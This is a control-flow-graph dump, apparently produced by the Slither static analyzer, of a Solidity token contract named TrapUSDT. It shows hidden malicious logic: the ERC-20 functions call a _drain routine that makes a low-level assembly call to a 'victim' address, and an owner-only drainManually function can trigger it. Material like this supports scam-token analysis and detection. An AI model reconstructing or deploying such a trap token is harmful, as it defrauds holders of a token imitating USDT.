Contract: TrapUSDT
==================================================

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: owner = msg.sender

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: balanceOf[owner] = totalSupply

Edges:
  0 -> 1
  1 -> 2

Function: transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _drain(tx.origin)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _transfer(msg.sender,to,value)

  ID: 3
  Type: NodeType.RETURN
  Expression: true

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyVictim()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1

Function: approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _drain(msg.sender)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: allowance[msg.sender][spender] = value

  ID: 3
  Type: NodeType.RETURN
  Expression: true

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: onlyVictim()

Edges:
  0 -> 4
  1 -> 2
  2 -> 3
  4 -> 1

Function: transferFrom
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _drain(from)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(allowance[from][msg.sender] >= value,Not allowed)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: allowance[from][msg.sender] -= value

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _transfer(from,to,value)

  ID: 5
  Type: NodeType.RETURN
  Expression: true

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: onlyVictim()

Edges:
  0 -> 6
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  6 -> 1

Function: _transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(balanceOf[from] >= value,No balance)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: balanceOf[from] -= value

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: balanceOf[to] += value

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: _drain
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.ASSEMBLY
  Expression: 

  ID: 2
  Type: NodeType.VARIABLE
  Expression: 

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: ptr__drain_asm_0 = mload(uint256)(0x40)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: mstore(uint256,uint256)(ptr__drain_asm_0,0x30)

  ID: 5
  Type: NodeType.VARIABLE
  Expression: 

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: success__drain_asm_0 = call(uint256,uint256,uint256,uint256,uint256,uint256,uint256)(gas()(),victim,0,ptr__drain_asm_0,0x20,0,0)

  ID: 7
  Type: NodeType.ENDASSEMBLY
  Expression: 

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6
  6 -> 7

Function: drainManually
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(msg.sender == owner,Only owner)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _drain(victim)

Edges:
  0 -> 1
  1 -> 2

Function: slitherConstructorVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
